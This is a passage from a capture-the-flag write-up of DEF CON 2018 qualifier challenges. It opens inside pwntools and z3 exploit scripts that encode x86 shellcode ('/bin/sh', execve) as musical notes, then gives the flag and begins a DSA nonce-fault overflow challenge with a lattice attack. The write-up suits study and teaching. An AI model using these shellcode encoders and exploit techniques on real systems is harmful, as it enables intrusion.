encoder(\u0026#34;F0F0\u0026#34;) # Set al 0xd6 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D9\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x2 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x86 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D1\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D9\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x83 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x4d payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;B3\u0026#39;, \u0026#39;G1\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x88 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D1\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G3\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x3a payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G3\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x7d payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x06 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D9\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x73 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D9\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x77 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0xfa payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x77 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0xe1 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0x8b payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0xb3 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) print len(payload) payload += encoder(NOP)*(2260/4 - 1) payload += \u0026#34;\\xff\\xff\u0026#34; payload += p32(MASK) payload += \u0026#34;/bin/sh\u0026#34; payload += p64(0x0) print \u0026#34;PAYLOAD LEN:\u0026#34;, len(payload) def solve_pow(s, n): with context.local(log_level=\u0026#39;warning\u0026#39;): r = remote(\u0026#39;our_1337_server\u0026#39;, 13337) r.sendline(s + \u0026#39; \u0026#39; + str(n)) res = r.recvline().strip() r.close() return res def connect(): r = remote(\u0026#39;4e6b5b46.quals2018.oooverflow.io\u0026#39;, 31337) r.recvuntil(\u0026#39;Challenge: \u0026#39;) chall_s = r.recvline().strip() r.recvuntil(\u0026#39;n: \u0026#39;) chall_n = int(r.recvline().strip()) print \u0026#39;solving pow %s %d\u0026#39; % (chall_s, chall_n) r.sendline(solve_pow(chall_s, chall_n)) return r i = 0 done = False while not done: try: conn = connect() #conn = remote(\u0026#34;127.0.0.1\u0026#34;, 4000) conn.recvuntil(\u0026#34;sound?\u0026#34;) conn.send(payload) conn.interactive() except: conn.close() pass Third Exploit # The third idea requires to carefully craft a copy primitive via xor instructions, and use the available instructions considering whether you have both a read and write gadget where needed, turns out we need to employ edi as \u0026ldquo;source\u0026rdquo; register and esi as a \u0026ldquo;destination\u0026rdquo; register. We can set the masks accordingly by using just two gadgets. The shellcode in the USER_INPUT section will get copied via the xor instructions. If we spray enough (that\u0026rsquo;s why we choose a 3 byte NOP (e.g. G#0) we can craft the masks requiring us only 5 bits, making the exploit feasible.\n#from romanpwn import * from pwn import * from capstone import * from z3 import * import struct import itertools val_static = [0, 927150662, 927150660, 0, 927150658, 860042308, 944191811, 910570564, 893728833, 876752962, 0, 876688449, 1110451014, 876951111, 826552389, 960770117, 893858882, 0] # 1178149703 # 1178149700 # 1177690945 # 1110451014 # 591870278 fanno casini (aaa) vals = val_static + [ 0x4f4f4f4f, # esp + 0x38 0x2d2d2d2d, # esp + 0x40 0x57202d2d, # esp + 0x42 0x6c655720, # esp + 0x44 0x636c6557, # esp + 0x45 0x6f636c65, # esp + 0x46 0x656d6f63, # esp + 0x48 0x20656d6f, # esp + 0x49 0x7420656d] # esp + 0x4a offsets = { 0x4f4f4f4f: 0, 0x2d2d2d2d: 0x8, 0x57202d2d: 0xa, 0x6c655720: 0xc, 0x636c6557: 0xd, 0x6f636c65: 0xe, 0x656d6f63: 0x10, 0x20656d6f: 0x11, 0x7420656d: 0x12 } def set_eax(eax_val, tolerance=0xfff): # NB assumes edi was not changed! solver = Solver() l = [] exp = None for i in range(len(vals)): temp = BitVec(\u0026#39;b\u0026#39;+str(i), 32) l.append(temp) solver.add(Or(temp == 0, temp == 0xffffffff)) if exp is not None: exp = exp ^ (vals[i] \u0026amp; temp) else: exp = (vals[i] * temp) solver.add(exp \u0026gt;= eax_val) solver.add(exp \u0026lt;= eax_val + tolerance) if solver.check() == unsat: print \u0026#39;UNSAT\u0026#39; m = solver.model() res = 0 for i in range(len(vals)): if not m[l[i]] == 0: # print(hex(vals[i])) res ^= vals[i] print \u0026#34;Address found:\u0026#34;, hex(res) #assert res == eax_val shellcode = [] for i in range(18): if not m[l[i]] == 0: # NB increases esp temp = struct.pack(\u0026#39;\u0026lt;L\u0026#39;, vals[i]) shellcode += [\u0026#39;D5\u0026#39;, temp[:2], temp[2:]] incs = 0 for i in range(18, 27): if not m[l[i]] == 0: while incs \u0026lt; offsets[vals[i]]: shellcode += [\u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;] # inc edi incs += 1 shellcode += [\u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;] return shellcode #print set_eax(0x40404a4b) def set_al(al_val, prev_value=0, position=0): bytelist = [178, 201, 245, 108, 132, 152, 174, 200, 223, 234, 252, 10, 21, 205, 226, 243, 56, 67, 121, 207, 238, 2, 18, 59, 156, 234, 102, 134, 149, 162, 182, 152, 191, 222, 246, 5, 22, 63, 94, 131, 139, 156, 209, 231, 26, 163, 202, 73, 111, 146, 163, 217, 235, 103, 130, 192, 222, 243, 16, 59, 68, 89, 108, 131, 158, 197, 14, 41, 61, 194, 227, 0, 32, 64, 33, 0, 16, 255] big_vals = { 0x46: 0x37433246, 0x44: 0x37433244, 0x42: 0x37433242, 0x43: 0x38473943, 0x41: 0x35453841, 0x47: 0x34453647, 0x45: 0x31443045, } dvals = {65: [\u0026#39;D5\u0026#39;, \u0026#39;A8\u0026#39;, \u0026#39;E5\u0026#39;], 66: [\u0026#39;D5\u0026#39;, \u0026#39;B2\u0026#39;, \u0026#39;C7\u0026#39;], 67: [\u0026#39;D5\u0026#39;, \u0026#39;C9\u0026#39;, \u0026#39;G8\u0026#39;], 68: [\u0026#39;D5\u0026#39;, \u0026#39;D2\u0026#39;, \u0026#39;C7\u0026#39;], 69: [\u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D1\u0026#39;], 70: [\u0026#39;D5\u0026#39;, \u0026#39;F2\u0026#39;, \u0026#39;C7\u0026#39;], 71: [\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;], #0x40: [\u0026#39;B6\u0026#39;, \u0026#39;B2\u0026#39;, \u0026#39;E1\u0026#39;], # 0x31 #0xe5: [\u0026#39;B6\u0026#39;,\u0026#39;B2\u0026#39;, \u0026#39;E2\u0026#39;], # 0x32 #0xf7: [\u0026#39;B6\u0026#39;,\u0026#39;B2\u0026#39;, \u0026#39;E3\u0026#39;], # 0x33 #0xff: [\u0026#39;B6\u0026#39;,\u0026#39;B2\u0026#39;, \u0026#39;E4\u0026#39;], # 0x34 # 0x69: [\u0026#39;B6\u0026#39;,\u0026#39;B2\u0026#39;,\u0026#39;E9\u0026#39;] # 0x39 } vals = [x for x in dvals] ebpgadgets = [[\u0026#39;G2\u0026#39;, \u0026#39;E\u0026#39; + str(i)] for i in (0, 4, 8)] incebp = [\u0026#39;E5\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;C6\u0026#39;, \u0026#39;E5\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;C6\u0026#39;] steps = 0 shellcode = [] if position == 0: for _ in range(144 / 2): shellcode += incebp position = 144 while position \u0026lt; (len(bytelist) * 4) + 144: available_bits = bytelist[(position-144)/4:(position-144)/4+3] #print(available_bits) tempvals = vals + available_bits #print(tempvals) solver = Solver() l = [] exp = None for i in range(len(tempvals)): temp = BitVec(\u0026#39;b\u0026#39;+str(i), 8) l.append(temp) solver.add(Or(temp == 0, temp == 0xff)) if exp is not None: exp = exp ^ (tempvals[i] \u0026amp; temp) else: exp = (tempvals[i] \u0026amp; temp) solver.add(exp == (al_val ^ prev_value)) solver.check() try: m = solver.model() for i in range(len(vals)): if not m[l[i]] == 0: print(\u0026#39;cons\u0026#39;, hex(vals[i])) # NB increases esp shellcode += dvals[vals[i]] for i in range(len(tempvals) - len(vals)): if not m[l[len(vals) + i]] == 0: print(\u0026#39;mem\u0026#39;, hex(available_bits[i])) shellcode += ebpgadgets[i] print(steps) return shellcode, position except: #print(\u0026#34;unsat\u0026#34;) shellcode += incebp * 2 position += 4 steps += 1 raise Exception(\u0026#34;not solvable!\u0026#34;) binshaddr = 0x40404a4f shellcode = asm(shellcraft.execve(\u0026#39;/bin/ls\u0026#39;, [\u0026#39;\u0026#39;], [])) NOP = \u0026#39;B7\u0026#39; #inc edx; aaa ; DNOP = \u0026#39;G#7\u0026#39; #inc edi; and esi, dword ptr [edi]; n_to_f = {\u0026#39;G#1\u0026#39;: 101, \u0026#39;G#0\u0026#39;: 51, \u0026#39;G#3\u0026#39;: 404, \u0026#39;G#2\u0026#39;: 202, \u0026#39;G#5\u0026#39;: 1614, \u0026#39;G#4\u0026#39;: 807, \u0026#39;G#7\u0026#39;: 6456, \u0026#39;G#6\u0026#39;: 3228, \u0026#39;G#9\u0026#39;: 25823, \u0026#39;G#8\u0026#39;: 12912, \u0026#39;G7\u0026#39;: 6094, \u0026#39;G6\u0026#39;: 3047, \u0026#39;G5\u0026#39;: 1524, \u0026#39;G4\u0026#39;: 762, \u0026#39;G3\u0026#39;: 381, \u0026#39;G2\u0026#39;: 191, \u0026#39;G1\u0026#39;: 96, \u0026#39;G0\u0026#39;: 48, \u0026#39;G9\u0026#39;: 24374, \u0026#39;G8\u0026#39;: 12187, \u0026#39;D#8\u0026#39;: 9673, \u0026#39;D#9\u0026#39;: 19346, \u0026#39;D#6\u0026#39;: 2419, \u0026#39;A8\u0026#39;: 6840, \u0026#39;B4\u0026#39;: 480, \u0026#39;B5\u0026#39;: 960, \u0026#39;B6\u0026#39;: 1920, \u0026#39;B7\u0026#39;: 3839, \u0026#39;B0\u0026#39;: 30, \u0026#39;B1\u0026#39;: 60, \u0026#39;B2\u0026#39;: 120, \u0026#39;B3\u0026#39;: 240, \u0026#39;B8\u0026#39;: 7678, \u0026#39;B9\u0026#39;: 15355, \u0026#39;F#0\u0026#39;: 45, \u0026#39;F#1\u0026#39;: 90, \u0026#39;F#2\u0026#39;: 180, \u0026#39;F#3\u0026#39;: 360, \u0026#39;F#4\u0026#39;: 719, \u0026#39;F#5\u0026#39;: 1438, \u0026#39;F#6\u0026#39;: 2876, \u0026#39;F#7\u0026#39;: 5752, \u0026#39;F#8\u0026#39;: 11503, \u0026#39;F#9\u0026#39;: 23006, \u0026#39;E9\u0026#39;: 20496, \u0026#39;E8\u0026#39;: 10248, \u0026#39;E5\u0026#39;: 1281, \u0026#39;E4\u0026#39;: 641, \u0026#39;E7\u0026#39;: 5124, \u0026#39;E6\u0026#39;: 2562, \u0026#39;E1\u0026#39;: 81, \u0026#39;E0\u0026#39;: 41, \u0026#39;E3\u0026#39;: 321, \u0026#39;E2\u0026#39;: 161, \u0026#39;A#3\u0026#39;: 227, \u0026#39;A#2\u0026#39;: 114, \u0026#39;A#1\u0026#39;: 57, \u0026#39;A#0\u0026#39;: 29, \u0026#39;A#7\u0026#39;: 3624, \u0026#39;A#6\u0026#39;: 1812, \u0026#39;A#5\u0026#39;: 906, \u0026#39;A#4\u0026#39;: 453, \u0026#39;A#9\u0026#39;: 14493, \u0026#39;A#8\u0026#39;: 7247, \u0026#39;C9\u0026#39;: 16268, \u0026#39;C8\u0026#39;: 8134, \u0026#39;C3\u0026#39;: 255, \u0026#39;C2\u0026#39;: 128, \u0026#39;C1\u0026#39;: 64, \u0026#39;C0\u0026#39;: 32, \u0026#39;C7\u0026#39;: 4067, \u0026#39;C6\u0026#39;: 2034, \u0026#39;C5\u0026#39;: 1017, \u0026#39;C4\u0026#39;: 509, \u0026#39;F0\u0026#39;: 43, \u0026#39;F1\u0026#39;: 85, \u0026#39;F2\u0026#39;: 170, \u0026#39;F3\u0026#39;: 340, \u0026#39;F4\u0026#39;: 679, \u0026#39;F5\u0026#39;: 1358, \u0026#39;F6\u0026#39;: 2715, \u0026#39;F7\u0026#39;: 5429, \u0026#39;F8\u0026#39;: 10858, \u0026#39;F9\u0026#39;: 21715, \u0026#39;A1\u0026#39;: 54, \u0026#39;A0\u0026#39;: 27, \u0026#39;A3\u0026#39;: 214, \u0026#39;A2\u0026#39;: 107, \u0026#39;A5\u0026#39;: 855, \u0026#39;A4\u0026#39;: 428, \u0026#39;A7\u0026#39;: 3420, \u0026#39;A6\u0026#39;: 1710, \u0026#39;A9\u0026#39;: 13680, \u0026#39;D#7\u0026#39;: 4837, \u0026#39;D#4\u0026#39;: 605, \u0026#39;D#5\u0026#39;: 1210, \u0026#39;D#2\u0026#39;: 152, \u0026#39;D#3\u0026#39;: 303, \u0026#39;D#0\u0026#39;: 38, \u0026#39;D#1\u0026#39;: 76, \u0026#39;C#9\u0026#39;: 17235, \u0026#39;C#8\u0026#39;: 8618, \u0026#39;C#5\u0026#39;: 1078, \u0026#39;C#4\u0026#39;: 539, \u0026#39;C#7\u0026#39;: 4309, \u0026#39;C#6\u0026#39;: 2155, \u0026#39;C#1\u0026#39;: 68, \u0026#39;C#0\u0026#39;: 34, \u0026#39;C#3\u0026#39;: 270, \u0026#39;C#2\u0026#39;: 135, \u0026#39;D8\u0026#39;: 9130, \u0026#39;D9\u0026#39;: 18260, \u0026#39;D6\u0026#39;: 2283, \u0026#39;D7\u0026#39;: 4565, \u0026#39;D4\u0026#39;: 571, \u0026#39;D5\u0026#39;: 1142, \u0026#39;D2\u0026#39;: 143, \u0026#39;D3\u0026#39;: 286, \u0026#39;D0\u0026#39;: 36, \u0026#39;D1\u0026#39;: 72} def encoder(note): r = \u0026#34;\u0026#34; i = 0 while i \u0026lt; len(note): #print note[i:i+2] if i+2 \u0026lt;= len(note) and note[i:i+2] in n_to_f: r += p16(n_to_f[note[i:i+2]]) i += 2 elif i+3 \u0026lt;= len(note) and note[i:i+3] in n_to_f: r += p16(n_to_f[note[i:i+3]]) i += 3 else: raise RuntimeError(str(i)) return r MASK1 = 0x40404800 MASK2 = 0x60606800 payload = \u0026#34;\u0026#34; SETEAX = set_eax(0x40404a4b, 0x0) md = Cs(CS_ARCH_X86, CS_MODE_32) baseaddr = 0x60606000 def disasm(code, address): instructions = \u0026#39;\u0026#39; regex = r\u0026#39;ptr \\[e[bcd]x\u0026#39; size = 0 for i in md.disasm(code, address): size += i.size instructions += \u0026#39;%s %s; \u0026#39; % (i.mnemonic, i.op_str) if re.findall(regex, i.op_str): return None if size != len(code): return None return instructions # SET_EAX = [\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D1\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;] #set eax to 0x40404a4b (== \u0026amp;mask1) payload += encoder(\u0026#34;\u0026#34;.join(SETEAX)) payload += encoder(\u0026#39;C#8\u0026#39;) #inc ebx; and edi, dword ptr [eax]; eax must point to mask1 0x4040404xxx payload += encoder(\u0026#39;C#7\u0026#39;) #inc ebx; and esi, dword ptr [edi]; # copy primitive assume we\u0026#39;re writing to space memset to \\x00 COPY = \u0026#34;\u0026#34; # store the current value of al so we can xor back COPY += encoder(\u0026#39;B0F1\u0026#39;) #inc edx; xor byte ptr [esi + 0x31], al; COPY += encoder(\u0026#39;B2F4\u0026#39;) #inc edx; xor al, byte ptr [esi + 0x34]; next note-nop after three bytes use it to xor happily # NOP is 2 bytes, we can use this to xor out stuff COPY += encoder(\u0026#39;G2G8\u0026#39;) #inc edi; xor al, byte ptr [edi + 0x38]; COPY += encoder(\u0026#39;B0F1\u0026#39;) #inc edx; xor byte ptr [esi + 0x31], al; COPY += encoder(\u0026#39;F7\u0026#39;) #inc esi; aaa; \u0026#34;\u0026#34;\u0026#34; write must be aligned to \u0026#34;NOTE-NOP\u0026#34; opcodes, we can use a different version of this depending on \u0026#34;nop\u0026#34; alignment :) COPY += encoder(\u0026#39;B0F0\u0026#39;) #inc edx; xor byte ptr [esi + 0x30], al; COPY += encoder(\u0026#39;B2F2\u0026#39;) #inc edx; xor al, byte ptr [esi + 0x32]; # NOP is 2 bytes, we can use this to xor out stuff COPY += encoder(\u0026#39;G2G8\u0026#39;) #inc edi; xor al, byte ptr [edi + 0x38]; COPY += encoder(\u0026#39;B0F0\u0026#39;) #inc edx; xor byte ptr [esi + 0x30], al; COPY += encoder(\u0026#39;F7\u0026#39;) #inc esi; aaa; \u0026#34;\u0026#34;\u0026#34; for _ in xrange(len(shellcode)): payload += COPY mask_delta = (0x800 - len(payload) - 2) n_nops = (mask_delta / 2 ) # a single note is encoded in a word NOPS = encoder(DNOP) * n_nops payload += NOPS payload += \u0026#34;\\xff\\xff\u0026#34; # payload += encoder(\u0026#39;G3G2\u0026#39;) #inc edi; xor eax, dword ptr [edi + 0x30]; print hex(len(payload)) # mask to let us use \\x00 (add BYTE PTR [eax],al) as nop payload += \u0026#39;a\u0026#39; * (0x800 - len(payload)) assert len(payload) == 0x800 payload += p32(MASK2) payload += \u0026#39;b\u0026#39; * (0x838 - len(payload)) payload += \u0026#39;c\u0026#39; + shellcode payload += \u0026#39;d\u0026#39; * (0xa4b - len(payload)) payload += p32(MASK1) payload += \u0026#39;\\x00\\x00\u0026#39; #print SETEAX #print \u0026#39;\\n\u0026#39;.join(disasm(\u0026#39;\u0026#39;.join(SETEAX), baseaddr).split(\u0026#39;;\u0026#39;)) with open(\u0026#39;payload\u0026#39;,\u0026#39;w\u0026#39;) as f: f.write(payload) \u0026#34;\u0026#34;\u0026#34; p = process(\u0026#39;./nop\u0026#39;) p.sendline(payload) p.readline() p.readline() if r: print \u0026#39;WOOOOOOOOOO %s\u0026#39; % r \u0026#34;\u0026#34;\u0026#34; Epilogue # We developed the three exploits in parallel. The Second exploit was the first to be ready, but unfortunately we set the solver to use a 0xff we found on the stack and it worked in every laptop in the lab but not in remote\u0026hellip;..\nThe First exploit was the second to be ready and succesfully led us to the flag.\nWe finished the Third exploit just beacause we enjoyed the challenge and thought it was an elegant idea!\nOh, the flag was:\nOOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}\nOfficial # We are given a x86_64 ELF\nwe can Sign a command (allowed ls\u0026hellip;, stat\u0026hellip;, du\u0026hellip; , forbidden cat flag) and get a signature (r,s) we can Execute a command if we provide a signature (r,s) By examining the binary we understand that it signs the command with DSA. The public parameters are hard coded in the binary as strings, while the private parameter is loaded from a file.\nThis is the signing process:\nThe DSA nonce is generated reading 0x14 bytes from /dev/urandom and stored in a global variable (k), the random bytes are later shuffled during the signing process The input is then read, up to 256 bytes. There is a buffer overflow (at offset 0x1D26): with a 256 byte long input, the first byte of k is overwritten by a null byte k is then shuffled, and the overwritten byte is moved from the first position (k[0]) to the last (k[19]) k is interpreted as an hex number This means that we can reliably and consistently set the least significant byte of k to a fixed amount(0x00).\nDSA is vulnerable to faults in the secrets, so even a few constant bits can compromise the private key.\nBy reading this paper, we decided to implement a lattice attack on the alghorithm.\nWe estimated that we needed ~70 faulted signatures to be able to implement the attack (and to guarantee that the SVP solution contained the private key).\nSolver # We collected several signatures\nfrom Crypto.PublicKey import DSA q = 739904609682520586736011252451716180456601329519 sign = [[47817980213997116983990891662989699152988893000, 